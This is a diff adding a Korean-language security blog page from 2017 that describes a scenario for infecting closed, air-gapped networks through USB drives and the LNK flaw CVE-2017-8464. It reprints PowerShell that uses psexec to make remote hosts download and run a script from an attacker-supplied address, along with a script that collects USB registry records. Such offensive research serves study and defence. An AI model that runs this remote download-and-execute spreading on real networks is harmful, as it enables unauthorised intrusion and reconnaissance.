@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>[HACKING] Closed network infection scenario and Detecting hidden networks (Using USB/Exploit) | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="[HACKING] Closed network infection scenario and Detecting hidden networks (Using USB/Exploit)">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/hacking-closed-network-infection/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="[HACKING] Closed network infection scenario and Detecting hidden networks (Using USB/Exploit)">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/hacking-closed-network-infection/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"[HACKING] Closed network infection scenario and Detecting hidden networks (Using USB/Exploit)","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/hacking-closed-network-infection/","datePublished":"2017-07-15T00:00:00+00:00","dateModified":"2021-07-10T00:00:00+00:00","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2017-hacking-closed-network-infection.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/"},{"@type":"ListItem","position":5,"name":"[HACKING] Closed network infection scenario and Detecting hidden networks (Using USB/Exploit)"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">[HACKING] Closed network infection scenario and Detecting hidden networks (Using USB/Exploit)</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2017-07-15">
+                        JULY 15, 2017
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>어제 EDB를 둘러보던 중 재미있는 문서를 보았는데요. 여러가지 생각을 해보다보니 포스팅으로 작성할만한 것 같아 글을써봅니다.</p>
+<p>오늘은 USB와 LNK Exploit을 이용해서 폐쇄망에 침투/감염 시나리오와 Powershell trick과 USB를 이용해 네트워크 구성, 더 상세하겐 내부에서 사용되는 USB의 흐름을 보는 이야기로 준비해보았습니다.</p>
+<p><a href="https://1.bp.blogspot.com/-SnQH1urcPg0/WWmRMpUZIdI/AAAAAAAACQc/UO1UkF1_3uo10eelxYvoTo1MbnhfytAIwCLcBGAs/s1600/123123hahwul.png"><img loading="lazy" src="https://1.bp.blogspot.com/-SnQH1urcPg0/WWmRMpUZIdI/AAAAAAAACQc/UO1UkF1_3uo10eelxYvoTo1MbnhfytAIwCLcBGAs/s640/123123hahwul.png" alt="" /></a></p>
+<h2 id="lnk-remote-code-executioncve-2017-8464">LNK Remote Code Execution(CVE-2017-8464)</h2>
+<p>CVE-2017-8464(LNK Remote Code Execution) 는 올 6월 발표된 따끈따끈한 취약점니다.
+코드가 삽입된 아이콘 파일은 윈도우 탐색기가 읽는(보는) 순간 임의의 코드 실행이 가능합니다. 물론 공격코드나 분석에 대한 정보가 없어 해당 내용으로 이야기를 깊게 풀기는 조금 어려울 것 같습니다.</p>
+<p>다만 중국에 demonsec(demonsec666)이 올린 포스팅과 youtube 찾아보시면 조금은 도움되지 않을까 싶네요.  정확히 8464는 아닌 것 같지만.. (제 입장에서 중국어는 구글 번역에만 의존해야하니 넘 어렵군요)</p>
+<p>아이콘을 통해 감염이나 공격에 성공할 수 있는점은 아주 놀랍고 활용성도 굉장히 높습니다. 아이콘 파일을 탐색기에서 로드하는 순간 임의 코드 실행이 가능하기 때문에 아이콘을 전파할 수 있는 경로라면 모두 실행이 가능하고 일반적인 네트워크가 없는 경우에도 블루투스, 비콘, USB 등 아이콘을 전송할 수 있는 포인트는 많이 있습니다. 그중에서도 USB는 아주 치명적이겠죠.
+(USB를 연결하는 경우 대다수가 탐색기를 켤 것 같네요)</p>
+<p>EDB에서 봤던 문서에서는 네트워크 내 디바이스들의 USB를 정보를 수집하는 코드로 나와있고 저런 취약점을 같이 활용한다면 망이 분리되고 USB를 통해 연결할 수 있는 폐쇄망까지 노려볼 수 있는 좋은 루트가 되겠죠.</p>
+<h2 id="infection-scenario">Infection scenario</h2>
+<p>우리는 LNK Remote Code Execution 취약점을 이용하면 USB와 같이 여러 매체를 이용해서 공격코드를 실행하거나 악성코드를 전파할 수 있습니다.
+간단하죠..</p>
+<p>Exploit 코드를 USB에 넣고 누군가 옮겨주길 기다리면 됩니다. USB를 연결하고 탐색기로 USB 내부를 보는순간 Exploit 코드는 동작하고 그 PC도 악성코드에 감염될 수 있죠.
+폐쇄망 환경에선 인터넷 접근이 안되기 때문에 자료 이동에 불편함이 따릅니다. 그래서 여러가지 방법(임시로 네트워크 허용, 특정 디바이스만 허용, USB, CD  등등)으로 데이터를 이동시키죠.
+물론 잠깐이여도 네트워크는 연결하는 순간 폐쇄망으로서의 가치를 잃겠지만, 사용성이라는 측면도 보안만큼 중요하게 따라오기 때문에 이런 정책을 사용하는 네트워크도 있을거라 봅니다.</p>
+<p><a href="https://1.bp.blogspot.com/-jy4L3gIf_e8/WWmPdCi3aMI/AAAAAAAACQI/aV2N2IjLMQkpelVN03mWLEEWk0gn6WstgCLcBGAs/s1600/222.PNG"><img loading="lazy" src="https://1.bp.blogspot.com/-jy4L3gIf_e8/WWmPdCi3aMI/AAAAAAAACQI/aV2N2IjLMQkpelVN03mWLEEWk0gn6WstgCLcBGAs/s640/222.PNG" alt="" /></a></p>
+<p>그럼 어떻게 PC의 USB를 식별하고 연결할 수 있는지 알아보겠습니다.</p>
+<h2 id="windows에서의-usb-devices-연결">Windows에서의 USB Devices 연결</h2>
+<p>Windows에서 USB 연결 시 많은 정보가 PC에 저장됩니다. 대표적으로는 USBSTOR 가 있습니다.
+USBSTOR는 레지스트리 속성이며 연결된 USB 장치에 대한 많은 정보가 있습니다.
+(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet\Enum\USBSTOR)</p>
+<p>• Device name.
+• Class.
+• ClassGUID.
+• HardwareID.
+• Service provided by the device(e.g hdd)
+• Driver.
+• Etc.</p>
+<p>등등..</p>
+<p>우리는 Powershell을 이용해서 정보를 조금 더 쉽게 뽑아낼 수 있습니다.</p>
+<p>PS C:\Users\Administrator&gt; Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR** |
+Select FriendLyName,ContainerID</p>
+<pre><code>FriendlyName                                      ContainerID
+------------                                      -----------
+General USB Flash Disk USB Device                 {1a78c41b-a11e-5e94-91ed-a180a52f30b2}
+Generic Flash Disk USB Device                     {5d411558-71b7-5027-9bc1-482c1e9a1efb}
+Generic Mass Storage USB Device                   {70022a7c-191e-5cc7-a43f-50a79c9fd86c}
+JetFlash Transcend 4GB USB Device                 {ff19f1ee-f700-5974-9c3e-79f005c62ae6}
+LGE USB Drive USB Device                          {ff56e034-3e59-5b0b-a7a8-9d5f40163929}
+LGE USB Drive USB Device                          {45a0779e-a5f2-50b1-a9bd-3c64b624956f}
+MARSHAL MAL2250SA-T54 USB Device                  {c52af4c1-378a-5197-ad57-020de3fb8535}
+SanDisk Ultra Fit USB Device                      {47853ea7-57bf-5b16-b7a8-d622dda7758b}
+SMI USB DISK USB Device                           {165c607f-85ad-50c5-9a15-300d186b8bee}
+TERA U-80 USB Device                              {e5baf658-a1ea-5f00-a374-503b9c841ab8}
+USB Flash Drive USB Device                        {98651877-37f6-5be5-a4f2-5cdda58d0755}
+Ut165 USB2FlashStorage USB Device                 {029a53d5-5f1c-5864-b787-c93a5f8f0b13}
+</code></pre>
+<p>요런식으로 장비 이름과 ContainerID를 추출할 수 있죠.
+추가로 C:\Windows\inf\setupapi.dev.log 를 보시면 USB 연결 이력에 대한 많은 정보들을 획득할 수 있습니다.</p>
+<table>
+<thead>
+<tr>
+<th><a href="https://1.bp.blogspot.com/-EHhR8_6L2gA/WWmPzw7ZHbI/AAAAAAAACQQ/_hPHHYJaf6cB4V8oyZXNVLyxAqzYrfqMQCLcBGAs/s1600/333.PNG"><img loading="lazy" src="https://1.bp.blogspot.com/-EHhR8_6L2gA/WWmPzw7ZHbI/AAAAAAAACQQ/_hPHHYJaf6cB4V8oyZXNVLyxAqzYrfqMQCLcBGAs/s640/333.PNG" alt="" /></a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>setupapi.dev.log file!</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th><a href="https://3.bp.blogspot.com/-X1oEyhD6kT8/WWmPMmOLIeI/AAAAAAAACQE/x9SJEN8dWCA7YNpWu-Np1bYrGTEngbjBgCLcBGAs/s1600/111.PNG"><img loading="lazy" src="https://3.bp.blogspot.com/-X1oEyhD6kT8/WWmPMmOLIeI/AAAAAAAACQE/x9SJEN8dWCA7YNpWu-Np1bYrGTEngbjBgCLcBGAs/s640/111.PNG" alt="" /></a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>script run output</td>
+</tr>
+</tbody>
+</table>
+<p>그러면.. LNK Remote Exploit 과 USB 정보를 읽는 Posershell 스크립트라면 폐쇄망에 접근할 수 있는 가능성이 높아지겠군요!
+자 그럼 조금 더 활용해서 전체 네트워크와 USB의 관계를 알아보겠습니다.</p>
+<h2 id="networkusb-정보-수집을-위한-powershell-script">Network&amp;USB 정보 수집을 위한 PowerShell Script</h2>
+<p>USB 연결정보에 대해 알았으니 특정 USB 디바이스를 식별하는건 어렵지 않고, 다른 장치가 아닌 저장장치를 통해 전파하는 것도 어렵지 않겠죠.</p>
+<p>PSexec를 활용하면 SMB를 통해 쉽게 Powershell script 를 네트워크로 전파할 수 있습니다. 이게 가능할 경우 별도로 악성코드 제작이 필요없죠.
+(스크립트로만 동작할 수 있다면 분류에 따라 Fileless로도 볼 수 있겠군요)</p>
+<p>아래 부분은 ElevenPaths가 작성한 코드(<a href="https://github.com/ElevenPaths/USBHiddenNetworks">https://github.com/ElevenPaths/USBHiddenNetworks</a> )입니다. PSexec를 이용해 SMB로 Powershell script, 즉 SMB를 이용해서 USB 정보를 수집하는 코드를 전파하는 내용을 담고있습니다.</p>
+<pre><code># HiddenNetwork SMB / PSexec
+# Don´t forget change paths to files
+
+$computers = gc &quot;C:\scripts\HiddenNetworks\PSExec\USBHiddenNetworks_for_SMB\servers.txt&quot;  # 타겟의 주소가 들어갑니다.
+$url = &quot;http://TypeYourIPHere/RecollectUSBData.ps1&quot;  # 여기엔 이 코드 다음에 받을 서버의 주소가 들어갑니다.
+$sincro = 40   # 작업이 끝날때까지 기다려주기 위한 sleep 입니다.
+
+foreach ($computer in $computers) {
+    $Process = [Diagnostics.Process]::Start(&quot;cmd.exe&quot;,&quot;/c psexec.exe \\$computer powershell.exe -C IEX (New-Object Net.Webclient).Downloadstring('$url') &gt;&gt; C:\scripts\HiddenNetworks\PSExec\USBHiddenNetworks_for_SMB\usbdata.csv&quot;)
+    # [Diagnostics.Process]를 통해 cmd 를 실행하고 psexec.exe를 실행하여 타겟의 주소로 posershell 명령을 날립니다.
+    #  여기서 Powsershell 명령 중 IEX 옵션이 보이는데요, Invoke-Expression cmdlet를 통해 타겟 서비스에서 바로 실행해줍니다.
+    $id = $Process.Id
+    sleep $sincro
+    Write-Host &quot;Process created. Process id is $id&quot;
+    taskkill.exe /PID $id
+}
+</code></pre>
+<p>위 코드서 중요한건 3가지 정도 있습니다.</p>
+<ol>
+<li>psexec.exe가 AD(Active Directory)를 통해 명령을 던질 수 있다.</li>
+</ol>
+<ul>
+<li>다만 SMB 통신을 하려면 PStool이 있어야하지만, AD서버 관리자 PC라면 이야기가 달라짐, 아주 쉽게 전파가 가능함</li>
+</ul>
+<ol start="2">
+<li>powershell 명령의 인자 중 IEX 옵션은 Invoke-Expression를 의미하며 타겟에서 코드가 바로 실행되기 위해 포함시키죠.</li>
+<li>posershell 명령의 출력값은 특정 경로의 csv 파일로 저장합니다.</li>
+</ol>
+<p>두번째 코드(USB 데이터를 읽어오는 부분)을 보면 아래와 같습니다.</p>
+<p>RecollectUSBData.ps1</p>
+<pre><code># HiddenNetworks
+# SMB PSExec version
+# Output USB data from local computer to CSV file
+# 이 코드느 타겟에서 실행되는 코드입니다.
+
+$USBDevices = @()
+$USBContainerID = @()
+$USBComputerName = @()
+$USBComputerIP = @()
+$SubKeys2        = @()
+$USBSTORSubKeys1 = @()
+
+$Hive   = &quot;LocalMachine&quot;
+$Key    = &quot;SYSTEM\CurrentControlSet\Enum\USBSTOR&quot;
+
+$ComputerName = $Env:COMPUTERNAME   # 해당 컴퓨터 이름을 읽어오고..
+$ComputerIP = $localIpAddress=((ipconfig | findstr [0-9].\.)[0]).Split()[-1] # ip 정보를 읽어옵니다.
+
+$Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($Hive,$Computer) # 그 다음 ...
+$USBSTORKey = $Reg.OpenSubKey($Key) # 레지스트리를 열어 USBSTOR를 읽고 그 안의 값을 가져옵니다.
+$nop=$false
+
+Try {
+    $USBSTORSubKeys1  = $USBSTORKey.GetSubKeyNames()
+}
+Catch
+{
+    Write-Host &quot;Computer: &quot;,$ComputerName -foregroundcolor &quot;white&quot; -backgroundcolor &quot;red&quot;
+    Write-Host &quot;No USB data found&quot;
+    $nop=$true
+}
+
+# USB searching for devices connected
+if(-Not $nop)
+{
+    ForEach($SubKey1 in $USBSTORSubKeys1)
+    {
+        $Key2 = &quot;SYSTEM\CurrentControlSet\Enum\USBSTOR\$SubKey1&quot;
+        $RegSubKey2 = $Reg.OpenSubKey($Key2)
+        $SubkeyName2 = $RegSubKey2.GetSubKeyNames()
+        $Subkeys2  += &quot;$Key2\$SubKeyName2&quot;
+        $RegSubKey2.Close()
+
+    }
+
+    ForEach($Subkey2 in $Subkeys2)
+    {
+        $USBKey = $Reg.OpenSubKey($Subkey2)
+        $USBDevice = $USBKey.GetValue('FriendlyName')
+        $USBContainerID = $USBKey.GetValue('ContainerID')
+
+        If($USBDevice)
+        {
+            $USBDevices += New-Object -TypeName PSObject -Property @{
+            USBDevice = $USBDevice
+            USBContainerID = $USBContainerID
+            USBComputerName= $ComputerName
+            ComputerIP = $ComputerIP
+            }
+        }
+
+        $USBKey.Close()
+    }
+
+    # Output data to screen
+
+    for ($i=0; $i -lt $USBDevices.length; $i++) {   # Friendly Name, COntainerID 를 위에서 읽어온 후 Write-Host로 출력합니다.
+        $IDUnico=$USBDevices[$i] | Select -ExpandProperty &quot;USBContainerID&quot;
+        $USBNombre=$USBDevices[$i] | Select -ExpandProperty &quot;USBDevice&quot;
+        Write-Host &quot;$ComputerName,$ComputerIP,$USBNombre,$IDUnico&quot;
+    }
+}
+</code></pre>
+<p>이 코드가 동작하면 각 host 에서 pc의 정보와 usb 정보가 출력되고, 이는 최초 실행 코드에서 (New-Object Net.Webclient).Downloadstring('$url') &gt;&gt; C:\scripts\HiddenNetworks\PSExec\USBHiddenNetworks_for_SMB\usbdata.csv&quot;) 코드를 통해
+usbdata.csv 파일로 저장됩니다. 공격자는 순식간에 네트워크 정보와 USB 장치들관의 관계를 알 수 있습니다.</p>
+<p>수집된 파일은 여러가지 방면으로 사용될 수 있겠네요. 곰곰히 생각해보니.. 특정 USB ContainerID가 여러 PC에서 찍힌다면 분명 돌고도는 USB 이거나 업무에 사용되는 USB로 볼 수 있겠죠. 시간을 투자한다면 네트워크 구성과 함께 USB Network의 구성도 볼 수 있겠네요.</p>
+<table>
+<thead>
+<tr>
+<th><a href="https://1.bp.blogspot.com/-bfsrV4Zal9k/WWmPj1rZFrI/AAAAAAAACQM/SXnEFjbbJ28yMLOKPogsI6FtknWfTapiwCLcBGAs/s1600/4444.PNG"><img loading="lazy" src="https://1.bp.blogspot.com/-bfsrV4Zal9k/WWmPj1rZFrI/AAAAAAAACQM/SXnEFjbbJ28yMLOKPogsI6FtknWfTapiwCLcBGAs/s640/4444.PNG" alt="" /></a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>빨간선이 USB 연결점 / 파란선이 감염점</td>
+</tr>
+</tbody>
+</table>
+<h2 id="reference">Reference</h2>
+<p><a href="http://www.elladodelmal.com/2017/06/brutal-kangaroo-y-la-infeccion-por-usb.html">http://www.elladodelmal.com/2017/06/brutal-kangaroo-y-la-infeccion-por-usb.html</a>
+<a href="https://www.exploit-db.com/docs/42318.pdf">https://www.exploit-db.com/docs/42318.pdf</a>
+<a href="https://github.com/ElevenPaths/USBHiddenNetworks">https://github.com/ElevenPaths/USBHiddenNetworks</a></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
